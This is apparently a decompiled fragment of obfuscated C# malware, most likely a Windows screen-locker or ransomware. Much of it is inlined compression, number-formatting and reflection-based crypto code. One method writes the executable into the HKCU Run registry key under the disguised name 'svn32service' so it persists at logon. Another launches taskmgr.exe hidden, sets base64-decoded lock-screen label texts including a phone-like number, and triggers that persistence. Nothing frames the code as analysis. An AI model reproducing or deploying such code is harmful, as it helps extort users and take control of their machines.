			if (*(int*)((byte*)ptr + 52) != 0)
			{
				*(int*)((byte*)ptr + 8) = array2[*(int*)((byte*)ptr + 52)];
				*(int*)((byte*)ptr + 56) = Class27.smethod_29(*(int*)((byte*)ptr + 8));
				if (*(int*)((byte*)ptr + 52) <= 9)
				{
					do
					{
						class19_0.short_0[*(int*)((byte*)ptr + 56)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 60) = class19_0.short_0[*(int*)((byte*)ptr + 56) & 0x1FF];
					*(int*)((byte*)ptr + 64) = 1 << (*(int*)((byte*)ptr + 60) & 0xF);
					*(int*)((byte*)ptr + 60) = -(*(int*)((byte*)ptr + 60) >> 4);
					do
					{
						class19_0.short_0[*(int*)((byte*)ptr + 60) | (*(int*)((byte*)ptr + 56) >> 9)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < *(int*)((byte*)ptr + 64));
				}
				array2[*(int*)((byte*)ptr + 52)] = *(int*)((byte*)ptr + 8) + (1 << 16 - *(int*)((byte*)ptr + 52));
			}
			(*(int*)((byte*)ptr + 48))++;
		}
	}

	static void smethod_46(Class15.Class22 class22_0)
	{
		class22_0.int_9 = 0;
		class22_0.int_10 = 0;
	}

	static void smethod_47(Class1 class1_0)
	{
		string executablePath = Application.get_ExecutablePath();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		if (class1_0.bool_0)
		{
			registryKey.SetValue("svn32service", executablePath);
		}
		else
		{
			registryKey.DeleteValue("svn32service");
		}
		registryKey.Close();
	}

	static void smethod_48(Class15.Class17 class17_0, int int_0)
	{
		class17_0.uint_0 >>= int_0;
		class17_0.int_2 -= int_0;
	}

	static void smethod_49(Class15.Class24 class24_0)
	{
		class24_0.int_10 = (class24_0.byte_0[class24_0.int_14] << 5) ^ class24_0.byte_0[class24_0.int_14 + 1];
	}

	unsafe static bool smethod_50(Class15.Class24 class24_0, int int_0)
	{
		void* ptr = stackalloc byte[22];
		int num = 128;
		*(int*)ptr = 128;
		short[] short_ = class24_0.short_1;
		int int_ = class24_0.int_14;
		*(int*)((byte*)ptr + 4) = class24_0.int_14 + class24_0.int_12;
		*(int*)((byte*)ptr + 8) = Math.Max(class24_0.int_12, 2);
		*(int*)((byte*)ptr + 12) = Math.Max(class24_0.int_14 - 32506, 0);
		*(int*)((byte*)ptr + 16) = class24_0.int_14 + 258 - 1;
		((byte*)ptr)[20] = class24_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
		((byte*)ptr)[21] = class24_0.byte_0[*(int*)((byte*)ptr + 4)];
		if (*(int*)((byte*)ptr + 8) >= 8)
		{
			num >>= 2;
		}
		if (*(int*)ptr > class24_0.int_15)
		{
			*(int*)ptr = class24_0.int_15;
		}
		do
		{
			if (class24_0.byte_0[int_0 + *(int*)((byte*)ptr + 8)] != ((byte*)ptr)[21] || class24_0.byte_0[int_0 + *(int*)((byte*)ptr + 8) - 1] != ((byte*)ptr)[20] || class24_0.byte_0[int_0] != class24_0.byte_0[int_] || class24_0.byte_0[int_0 + 1] != class24_0.byte_0[int_ + 1])
			{
				continue;
			}
			int num2 = int_0 + 2;
			int_ += 2;
			while (class24_0.byte_0[++int_] == class24_0.byte_0[++num2] && class24_0.byte_0[++int_] == class24_0.byte_0[++num2] && class24_0.byte_0[++int_] == class24_0.byte_0[++num2] && class24_0.byte_0[++int_] == class24_0.byte_0[++num2] && class24_0.byte_0[++int_] == class24_0.byte_0[++num2] && class24_0.byte_0[++int_] == class24_0.byte_0[++num2] && class24_0.byte_0[++int_] == class24_0.byte_0[++num2] && class24_0.byte_0[++int_] == class24_0.byte_0[++num2] && int_ < *(int*)((byte*)ptr + 16))
			{
			}
			if (int_ > *(int*)((byte*)ptr + 4))
			{
				class24_0.int_11 = int_0;
				*(int*)((byte*)ptr + 4) = int_;
				*(int*)((byte*)ptr + 8) = int_ - class24_0.int_14;
				if (*(int*)((byte*)ptr + 8) >= *(int*)ptr)
				{
					break;
				}
				((byte*)ptr)[20] = class24_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
				((byte*)ptr)[21] = class24_0.byte_0[*(int*)((byte*)ptr + 4)];
			}
			int_ = class24_0.int_14;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > *(int*)((byte*)ptr + 12) && --num != 0);
		class24_0.int_12 = Math.Min(*(int*)((byte*)ptr + 8), class24_0.int_15);
		return class24_0.int_12 >= 3;
	}

	unsafe static void smethod_51(Class15.Class24 class24_0)
	{
		void* ptr = stackalloc byte[16];
		Array.Copy(class24_0.byte_0, 32768, class24_0.byte_0, 0, 32768);
		class24_0.int_11 -= 32768;
		class24_0.int_14 -= 32768;
		class24_0.int_13 -= 32768;
		*(int*)ptr = 0;
		while (*(int*)ptr < 32768)
		{
			*(int*)((byte*)ptr + 4) = class24_0.short_0[*(int*)ptr] & 0xFFFF;
			class24_0.short_0[*(int*)ptr] = (short)((*(int*)((byte*)ptr + 4) >= 32768) ? (*(int*)((byte*)ptr + 4) - 32768) : 0);
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < 32768)
		{
			*(int*)((byte*)ptr + 12) = class24_0.short_1[*(int*)((byte*)ptr + 8)] & 0xFFFF;
			class24_0.short_1[*(int*)((byte*)ptr + 8)] = (short)((*(int*)((byte*)ptr + 12) >= 32768) ? (*(int*)((byte*)ptr + 12) - 32768) : 0);
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static void smethod_52(byte[] byte_0, short[] short_0, Class15.Class22.Class23 class23_0)
	{
		class23_0.short_1 = short_0;
		class23_0.byte_0 = byte_0;
	}

	static void smethod_53(Class15.Class21 class21_0)
	{
		class21_0.int_6 |= 12;
	}

	static void smethod_54(Class15.Class17 class17_0)
	{
		class17_0.uint_0 >>= class17_0.int_2 & 7;
		class17_0.int_2 &= -8;
	}

	static void smethod_55(Class14 class14_0)
	{
		class14_0.type_0.GetMethod("Clear")!.Invoke(class14_0.object_0, new object[0]);
	}

	unsafe static string smethod_56(string string_0, Form0 form0_0)
	{
		void* ptr = stackalloc byte[8];
		char[] array = string_0.ToCharArray();
		*(int*)ptr = string_0.Length - 1;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			array[*(int*)((byte*)ptr + 4)] ^= array[*(int*)ptr];
			array[*(int*)ptr] ^= array[*(int*)((byte*)ptr + 4)];
			array[*(int*)((byte*)ptr + 4)] ^= array[*(int*)ptr];
			(*(int*)((byte*)ptr + 4))++;
			(*(int*)ptr)--;
		}
		return new string(array);
	}

	static void smethod_57(int int_0, bool bool_0, Class15.Class22 class22_0, byte[] byte_0, int int_1)
	{
		Class27.smethod_68(class22_0.class25_0, bool_0 ? 1 : 0, 3);
		Class27.smethod_13(class22_0.class25_0);
		Class27.smethod_75(class22_0.class25_0, int_0);
		Class27.smethod_75(class22_0.class25_0, ~int_0);
		Class27.smethod_44(byte_0, int_0, class22_0.class25_0, int_1);
		Class27.smethod_46(class22_0);
	}

	static string smethod_58(NumberConverter.Currency currency_0, NumberConverter.Language language_0, double double_0)
	{
		return NumberConverter.smethod_0(Convert.ToString(double_0), language_0, currency_0);
	}

	static int smethod_59(Class15.Class18 class18_0)
	{
		return class18_0.int_3;
	}

	unsafe static int smethod_60(int int_0, Class15.Class16 class16_0, byte[] byte_0, int int_1)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class16_0.int_17 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class27.smethod_66(int_1, class16_0.class18_0, byte_0, int_0);
				int_0 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_1 -= *(int*)((byte*)ptr + 4);
				if (int_1 == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class27.smethod_4(class16_0) || (class16_0.class18_0.int_3 > 0 && class16_0.int_17 != 11));
		return *(int*)ptr;
	}

	static void smethod_61(Class15.Class17 class17_0)
	{
		class17_0.int_2 = 0;
		class17_0.int_1 = 0;
		class17_0.int_0 = 0;
		class17_0.uint_0 = 0u;
	}

	static void smethod_62()
	{
		try
		{
			Class27.smethod_65();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_63(Form0 form0_0, object object_0, EventArgs eventArgs_0)
	{
		byte[] bytes = Convert.FromBase64String(Class4.firstlbl);
		((Control)form0_0.label_0).set_Text(Encoding.UTF8.GetString(bytes));
		byte[] bytes2 = Convert.FromBase64String(Class4.secondlbl);
		((Control)form0_0.label_1).set_Text(Encoding.UTF8.GetString(bytes2));
		Class0 class0_ = new Class0();
		Process process = new Process();
		process.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
		process.StartInfo.FileName = "taskmgr.exe";
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.Start();
		((Control)form0_0).Focus();
		Label label_ = form0_0.label_2;
		string thirdbl = Class4.thirdbl;
		string string_ = "380961283860";
		string string_2 = "06.05.2013";
		((Control)label_).set_Text(Class27.smethod_33(thirdbl, class0_, string_, string_2));
		byte[] bytes3 = Convert.FromBase64String(Class4.fourlbl);
		((Control)form0_0.label_3).set_Text(Encoding.UTF8.GetString(bytes3));
		Class1 class1_ = new Class1();
		Class27.smethod_47(class1_);
		Class27.smethod_31(class1_);
	}

	unsafe static void smethod_64(int int_0, bool bool_0, int int_1, Class15.Class22 class22_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[24];
		short[] short_;
		(short_ = class22_0.class23_0.short_0)[256] = (short)(short_[256] + 1);
		Class27.smethod_27(class22_0.class23_0);
		Class27.smethod_27(class22_0.class23_1);
		Class15.Class22.Class23 class23_ = class22_0.class23_0;
		Class15.Class22.Class23 class23_2 = class22_0.class23_2;
		Class27.smethod_83(class23_2, class23_);
		class23_ = class22_0.class23_1;
		class23_2 = class22_0.class23_2;
		Class27.smethod_83(class23_2, class23_);
		Class27.smethod_27(class22_0.class23_2);
		*(int*)ptr = 4;
		*(int*)((byte*)ptr + 4) = 18;
		while (*(int*)((byte*)ptr + 4) > *(int*)ptr)
		{
			if (class22_0.class23_2.byte_0[Class15.Class22.int_8[*(int*)((byte*)ptr + 4)]] > 0)
			{
				*(int*)ptr = *(int*)((byte*)ptr + 4) + 1;
			}
			(*(int*)((byte*)ptr + 4))--;
		}
		*(int*)((byte*)ptr + 8) = 14 + *(int*)ptr * 3 + Class27.smethod_26(class22_0.class23_2) + Class27.smethod_26(class22_0.class23_0) + Class27.smethod_26(class22_0.class23_1) + class22_0.int_10;
		*(int*)((byte*)ptr + 12) = class22_0.int_10;
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < 286)
		{
			*(int*)((byte*)ptr + 12) += class22_0.class23_0.short_0[*(int*)((byte*)ptr + 16)] * Class15.Class22.byte_2[*(int*)((byte*)ptr + 16)];
			(*(int*)((byte*)ptr + 16))++;
		}
		*(int*)((byte*)ptr + 20) = 0;
		while (*(int*)((byte*)ptr + 20) < 30)
		{
			*(int*)((byte*)ptr + 12) += class22_0.class23_1.short_0[*(int*)((byte*)ptr + 20)] * Class15.Class22.byte_3[*(int*)((byte*)ptr + 20)];
			(*(int*)((byte*)ptr + 20))++;
		}
		if (*(int*)((byte*)ptr + 8) >= *(int*)((byte*)ptr + 12))
		{
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 12);
		}
		if (int_1 >= 0 && int_0 + 4 < *(int*)((byte*)ptr + 8) >> 3)
		{
			Class27.smethod_57(int_0, bool_0, class22_0, byte_0, int_1);
		}
		else if (*(int*)((byte*)ptr + 8) == *(int*)((byte*)ptr + 12))
		{
			Class27.smethod_68(class22_0.class25_0, 2 + (bool_0 ? 1 : 0), 3);
			Class15.Class22.Class23 class23_3 = class22_0.class23_0;
			short[] short_2 = Class15.Class22.short_1;
			byte[] byte_ = Class15.Class22.byte_2;
			Class27.smethod_52(byte_, short_2, class23_3);
			class23_3 = class22_0.class23_1;
			short_2 = Class15.Class22.short_2;
			byte_ = Class15.Class22.byte_3;
			Class27.smethod_52(byte_, short_2, class23_3);
			Class27.smethod_9(class22_0);
			Class27.smethod_46(class22_0);
		}
		else
		{
			Class27.smethod_68(class22_0.class25_0, 4 + (bool_0 ? 1 : 0), 3);
			Class27.smethod_37(*(int*)ptr, class22_0);
			Class27.smethod_9(class22_0);
			Class27.smethod_46(class22_0);
		}
	}

	static void smethod_65()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class27.smethod_43;
		}
		catch
		{
		}
	}

	unsafe static int smethod_66(int int_0, Class15.Class18 class18_0, byte[] byte_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = class18_0.int_2;
		if (int_0 > class18_0.int_3)
		{
			int_0 = class18_0.int_3;
		}
		else
		{
			*(int*)ptr = (class18_0.int_2 - class18_0.int_3 + int_0) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_0;
		*(int*)((byte*)ptr + 8) = int_0 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class18_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_1, *(int*)((byte*)ptr + 8));
			int_1 += *(int*)((byte*)ptr + 8);
			int_0 = *(int*)ptr;
		}
		Array.Copy(class18_0.byte_0, *(int*)ptr - int_0, byte_0, int_1, int_0);
		class18_0.int_3 -= *(int*)((byte*)ptr + 4);
		if (class18_0.int_3 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	static int smethod_67(Class15.Class22 class22_0, int int_0)
	{
		if (int_0 == 255)
		{
			return 285;
		}
		int num = 257;
		while (int_0 >= 8)
		{
			num += 4;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static void smethod_68(Class15.Class25 class25_0, int int_0, int int_1)
	{
		class25_0.uint_0 |= (uint)(int_0 << class25_0.int_2);
		class25_0.int_2 += int_1;
		if (class25_0.int_2 >= 16)
		{
			class25_0.byte_0[class25_0.int_1++] = (byte)class25_0.uint_0;
			class25_0.byte_0[class25_0.int_1++] = (byte)(class25_0.uint_0 >> 8);
			class25_0.uint_0 >>= 16;
			class25_0.int_2 -= 16;
		}
	}

	static void smethod_69()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	static byte[] smethod_70(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class27.smethod_6(byte_1, byte_2, byte_0, 2);
	}

	static void smethod_71(Class15.Class18 class18_0, int int_0, int int_1)
	{
		if ((class18_0.int_3 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class18_0.int_2 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class18_0.int_2 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class18_0.byte_0, num, class18_0.byte_0, class18_0.int_2, int_0);
				class18_0.int_2 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class18_0.byte_0[class18_0.int_2++] = class18_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class27.smethod_3(class18_0, num, int_0, int_1);
		}
	}

	static int smethod_72(Class15.Class25 class25_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class25_0.int_2 >= 8)
		{
			class25_0.byte_0[class25_0.int_1++] = (byte)class25_0.uint_0;
			class25_0.uint_0 >>= 8;
			class25_0.int_2 -= 8;
		}
		if (int_1 > class25_0.int_1 - class25_0.int_0)
		{
			int_1 = class25_0.int_1 - class25_0.int_0;
			Array.Copy(class25_0.byte_0, class25_0.int_0, byte_0, int_0, int_1);
			class25_0.int_0 = 0;
			class25_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class25_0.byte_0, class25_0.int_0, byte_0, int_0, int_1);
			class25_0.int_0 += int_1;
		}
		return int_1;
	}

	unsafe static void smethod_73(Class15.Class22.Class23 class23_0)
	{
		void* ptr = stackalloc byte[16];
		int[] array = new int[class23_0.int_3];
		*(int*)ptr = 0;
		class23_0.short_1 = new short[class23_0.short_0.Length];
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class23_0.int_3)
		{
			array[*(int*)((byte*)ptr + 4)] = *(int*)ptr;
			*(int*)ptr += class23_0.int_2[*(int*)((byte*)ptr + 4)] << 15 - *(int*)((byte*)ptr + 4);
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < class23_0.int_1)
		{
			*(int*)((byte*)ptr + 12) = class23_0.byte_0[*(int*)((byte*)ptr + 8)];
			if (*(int*)((byte*)ptr + 12) > 0)
			{
				class23_0.short_1[*(int*)((byte*)ptr + 8)] = Class27.smethod_29(array[*(int*)((byte*)ptr + 12) - 1]);
				int[] array2;
				int[] array3 = (array2 = array);
				int num = *(int*)((byte*)ptr + 12) - 1;
				nint num2 = num;
				array3[num] = array2[num2] + (1 << 16 - *(int*)((byte*)ptr + 12));
			}
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static byte[] smethod_74(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class27.smethod_6(byte_2, byte_1, byte_0, 3);
	}

	static void smethod_75(Class15.Class25 class25_0, int int_0)
	{
		class25_0.byte_0[class25_0.int_1++] = (byte)int_0;
		class25_0.byte_0[class25_0.int_1++] = (byte)(int_0 >> 8);
	}

	static void smethod_76(NumberConverter.Currency currency_0, NumberConverter.Language language_0)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		NumberConverter.sortedList_0 = new SortedList(38);
		NumberConverter.sortedList_2 = new SortedList(5);
		NumberConverter.sortedList_1 = new SortedList(2);
		ResXResourceReader val = new ResXResourceReader(language_0.ToString() + ".resx");
		IDictionaryEnumerator enumerator = val.GetEnumerator();
		string text = "";
		string text2 = "";
		while (enumerator.MoveNext())
		{
			text = enumerator.Key.ToString();
			if (text.StartsWith("n"))
			{
				text2 = text.Remove(0, 1);
				NumberConverter.sortedList_0.Add(Convert.ToInt32(text2), enumerator.Value!.ToString());
			}
			if (text.StartsWith("alt"))
			{
				text2 = text.Remove(0, 3);
				NumberConverter.sortedList_1.Add(Convert.ToInt32(text2), enumerator.Value!.ToString());
			}
			if (text.StartsWith("r"))
			{
				text2 = text.Remove(0, 1);
				try
				{
					NumberConverter.sortedList_2.Add(Convert.ToInt32(text2), enumerator.Value!.ToString());
				}
				catch
				{
				}
				if (text2.Contains(currency_0.ToString()))
				{
					string value = text2.Replace(currency_0.ToString(), "");
					NumberConverter.sortedList_2.Add(Convert.ToInt32(value), enumerator.Value!.ToString());
				}
			}
			if (text.StartsWith("z"))
			{
				text2 = text.Remove(0, 1);
				if (text2.Contains(currency_0.ToString()))
				{
					NumberConverter.sortedList_0.Add(9999, enumerator.Value!.ToString());
				}
			}
		}
	}

	static byte[] smethod_77(byte[] byte_0)
	{
		return Class27.smethod_6((byte[])null, byte_0, (byte[])null, 1);
	}

	unsafe static int smethod_78(Class15.Class19 class19_0, Class15.Class17 class17_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class27.smethod_15(class17_0, 9)) >= 0)
		{
			if ((num2 = class19_0.short_0[num]) >= 0)
			{
				Class27.smethod_48(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class27.smethod_15(class17_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = class19_0.short_0[*(int*)ptr | (num >> 9)];
				Class27.smethod_48(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class17_0.int_2;
			num = Class27.smethod_15(class17_0, *(int*)((byte*)ptr + 8));
			num2 = class19_0.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class27.smethod_48(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class17_0.int_2;
		num = Class27.smethod_15(class17_0, *(int*)((byte*)ptr + 12));
		num2 = class19_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class27.smethod_48(class17_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	unsafe static int smethod_79(byte[] byte_0, Class15.Class21 class21_0)
	{
		void* ptr = stackalloc byte[22];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = byte_0.Length;
		*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 4);
		while (true)
		{
			*(int*)((byte*)ptr + 12) = Class27.smethod_72(class21_0.class25_0, byte_0, *(int*)ptr, *(int*)((byte*)ptr + 4));
			*(int*)ptr += *(int*)((byte*)ptr + 12);
			class21_0.long_0 += *(int*)((byte*)ptr + 12);
			*(int*)((byte*)ptr + 4) -= *(int*)((byte*)ptr + 12);
			if (*(int*)((byte*)ptr + 4) == 0 || class21_0.int_6 == 30)
			{
				break;
			}
			Class15.Class24 class24_ = class21_0.class24_0;
			((byte*)ptr)[20] = (((class21_0.int_6 & 4) != 0) ? ((byte)1) : ((byte)0));
			((byte*)ptr)[21] = (((class21_0.int_6 & 8) != 0) ? ((byte)1) : ((byte)0));
			if (Class27.smethod_28(((byte*)ptr)[21] != 0, class24_, ((byte*)ptr)[20] != 0))
			{
				continue;
			}
			if (class21_0.int_6 != 16)
			{
				if (class21_0.int_6 == 20)
				{
					*(int*)((byte*)ptr + 16) = 8 + (-class21_0.class25_0.int_2 & 7);
					while (*(int*)((byte*)ptr + 16) > 0)
					{
						Class27.smethod_68(class21_0.class25_0, 2, 10);
						*(int*)((byte*)ptr + 16) -= 10;
					}
					class21_0.int_6 = 16;
				}
				else if (class21_0.int_6 == 28)
				{
					Class27.smethod_13(class21_0.class25_0);
					class21_0.int_6 = 30;
				}
				continue;
			}
			return *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
		}
		return *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
	}

	static int smethod_80(Class15.Class18 class18_0)
	{
		return 32768 - class18_0.int_3;
	}

	static string smethod_81(NumberConverter.Language language_0, int int_0, NumberConverter.Currency currency_0)
	{
		return NumberConverter.smethod_0(Convert.ToString(int_0), language_0, currency_0);
	}

	static void smethod_82(byte[] byte_0, Class15.Class24 class24_0)
	{
		class24_0.byte_1 = byte_0;
		class24_0.int_17 = 0;
		class24_0.int_18 = byte_0.Length;
	}

	unsafe static void smethod_83(Class15.Class22.Class23 class23_0, Class15.Class22.Class23 class23_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class23_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class23_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					short[] short_;
					short[] array = (short_ = class23_0.short_0);
					int num2 = *(int*)((byte*)ptr + 16);
					nint num3 = num2;
					array[num2] = (short)(short_[num3] + 1);
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class23_1.int_1 && *(int*)((byte*)ptr + 8) == class23_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				short[] short_;
				short[] array2 = (short_ = class23_0.short_0);
				int num4 = *(int*)((byte*)ptr + 8);
				nint num3 = num4;
				array2[num4] = (short)(short_[num3] + (short)num);
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				short[] short_;
				(short_ = class23_0.short_0)[16] = (short)(short_[16] + 1);
			}
			else if (num <= 10)
			{
				short[] short_;
				(short_ = class23_0.short_0)[17] = (short)(short_[17] + 1);
			}
			else
			{
				short[] short_;
				(short_ = class23_0.short_0)[18] = (short)(short_[18] + 1);
			}
		}
	}

	static string smethod_84(byte[] byte_0)
	{
		string empty = string.Empty;
		return new SecurityIdentifier(byte_0, 0).ToString();
	}

	static int smethod_85(Class15.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	unsafe static bool smethod_86(Class15.Class20 class20_0, Class15.Class17 class17_0)
	{
		void* ptr = stackalloc byte[8];
		while (true)
		{
			switch (class20_0.int_8)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 4) = Class15.Class20.int_7[class20_0.int_13];
				int num = Class27.smethod_15(class17_0, *(int*)((byte*)ptr + 4));
				if (num >= 0)
				{
					Class27.smethod_48(class17_0, *(int*)((byte*)ptr + 4));
					num += Class15.Class20.int_6[class20_0.int_13];
					while (num-- > 0)
					{
						class20_0.byte_1[class20_0.int_14++] = class20_0.byte_2;
					}
					if (class20_0.int_14 == class20_0.int_12)
					{
						return true;
					}
					goto IL_0080;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class27.smethod_78(class20_0.class19_0, class17_0)) & -16) == 0)
				{
					class20_0.byte_1[class20_0.int_14++] = (class20_0.byte_2 = (byte)num2);
					if (class20_0.int_14 == class20_0.int_12)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class20_0.byte_2 = 0;
					}
					class20_0.int_13 = num2 - 16;
					class20_0.int_8 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class20_0.int_14 < class20_0.int_11)
				{
					*(int*)ptr = Class27.smethod_15(class17_0, 3);
					if (*(int*)ptr >= 0)
					{
						Class27.smethod_48(class17_0, 3);
						class20_0.byte_0[Class15.Class20.int_15[class20_0.int_14]] = (byte)(*(uint*)ptr);
						class20_0.int_14++;
						continue;
					}
					return false;
				}
				class20_0.class19_0 = new Class15.Class19(class20_0.byte_0);
				class20_0.byte_0 = null;
				class20_0.int_14 = 0;
				class20_0.int_8 = 4;
				goto case 4;
			case 2:
				class20_0.int_11 = Class27.smethod_15(class17_0, 4);
				if (class20_0.int_11 >= 0)
				{
					class20_0.int_11 += 4;
					Class27.smethod_48(class17_0, 4);
					class20_0.byte_0 = new byte[19];
					class20_0.int_14 = 0;
					class20_0.int_8 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class20_0.int_10 = Class27.smethod_15(class17_0, 5);
				if (class20_0.int_10 >= 0)
				{
					class20_0.int_10++;
					Class27.smethod_48(class17_0, 5);
					class20_0.int_12 = class20_0.int_9 + class20_0.int_10;
					class20_0.byte_1 = new byte[class20_0.int_12];
					class20_0.int_8 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class20_0.int_9 = Class27.smethod_15(class17_0, 5);
				if (class20_0.int_9 >= 0)
				{
					class20_0.int_9 += 257;
					Class27.smethod_48(class17_0, 5);
					class20_0.int_8 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0080:
			class20_0.int_8 = 4;
		}
	}

	static int smethod_87(Class15.Stream0 stream0_0)
	{
		return Class27.smethod_85(stream0_0) | (Class27.smethod_85(stream0_0) << 16);
	}

	static void smethod_88(NumberConverter.Currency currency_0, bool bool_0)
	{
		NumberConverter.string_0 = "";
		for (int i = 0; i < NumberConverter.arrayList_1.Count; i++)
		{
			string text = NumberConverter.sortedList_2[i]!.ToString();
			string[] array = NumberConverter.arrayList_1[i]!.ToString()!.Split(new char[1] { '.' });
			Convert.ToInt32(array[1]);
			if (i == 0 && bool_0)
			{
				text = NumberConverter.sortedList_0[9999]!.ToString();
			}
			if (array[0].ToString() != "  " || i == 1 || i == 0)
			{
				NumberConverter.string_0 = NumberConverter.string_0.Insert(0, array[0].ToString() + " " + text + " ");
			}
			text = "";
		}
	}

	static ICryptoTransform smethod_89(byte[] byte_0, byte[] byte_1, Class14 class14_0, bool bool_0)
	{
		class14_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class14_0.object_0, new object[1] { byte_0 });
		class14_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class14_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class14_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class14_0.object_0, new object[0]);
	}
}
